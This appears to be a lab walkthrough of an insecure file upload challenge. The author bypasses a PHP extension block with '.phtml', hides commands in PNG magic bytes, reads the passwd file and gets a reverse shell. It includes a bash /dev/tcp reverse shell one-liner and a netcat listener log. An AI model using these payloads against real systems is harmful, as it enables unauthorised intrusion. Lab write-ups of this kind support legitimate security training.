# Challange - Insecure File Upload

- Upon navigating to the site I got this interface:

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/ba7b506c-20ff-498e-a8bd-f47a11cccb33)

- On trying to upload text or other extension files except "png" and "jpg" I got the error message:

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/288466d2-9c14-48dc-a93d-cbbba7b7e36a)

- So, I go with uploading a png file and intercept the request to the burp suite to analyze the request:

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/a4eac0b5-5be8-4d53-b517-272c34797cca)

- After several tries, I can't able to upload the file, it returns an error:

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/cbb11337-31b4-4feb-bcf5-0f2ddc1df934)

- Quick ping to mind, maybe the extension "PHP" is in the blocked list. I tried with other extensions and see if they work.
- I tried with the extension ".sh" and luckily it works
- I inject a bash reverse shell into the image png magic bytes.
- cmd: `bash -i >& /dev/tcp/<IP>/4242 0>&1`

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/220cc4a2-b12f-4cc5-a67b-a5601703366c)

- Unfortunately, on navigating to the "bash.sh" file in the URL I got no results.

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/bf3aedd2-81ab-4374-98ab-430bd3b61431)

- On enumerating a little deeper, I notice that the website is working on PHP and PHP extension is blocked by the server.
- I do a quick search on Google regarding bypassing the php extension blockage.
- There I get to know about other extensions that worked with PHP such as:

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/c7a0813b-0829-49e3-a8e1-0df50f7ad261)

- I quickly changed the file extension from "image.php" to "image.phtml" and send a request through Burp Suite's repeater by inserting command line code in image png magick bytes.
- I get succeed in uploading the file with the extension ".phtml"
  
![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/06d8f150-69ff-4d4f-8533-9d2f49f4f975)

- On navigating to the file through the URL I successfully get the revert by embedding the command and argument into the URL.

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/0440bf04-f4a8-46fc-b5df-9fec0f26a1e5)

- I also get succeeded in fetching "passwd" file from the system.

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/e5669c4a-ffed-4b2a-af83-162e8425589b)

- To get the reverse shell to my system I use PHP reverse shell by pentest-monkey and replace it in place of the previous injected command.
- Netcat is set for listening.

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/433afc2b-6a69-4766-9e05-a9edffa75c59)

- On navigating to the uploaded file I got a reverse shell to my system successfully

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/851da0fe-7c14-46b3-bb71-953c009a07bb)

```bash
└─$ rlwrap nc -nvlp 1234
listening on [any] 1234 ...
connect to [xxx.xxx.xxx.89] from (UNKNOWN) [xxx.xxx.xx.4] 39498
Linux d19181ed4936 6.3.0-kali1-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.3.7-1kali1 (2023-06-29) x86_64 GNU/Linux
 08:36:38 up  5:06,  0 users,  load average: 1.22, 1.41, 1.59
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```
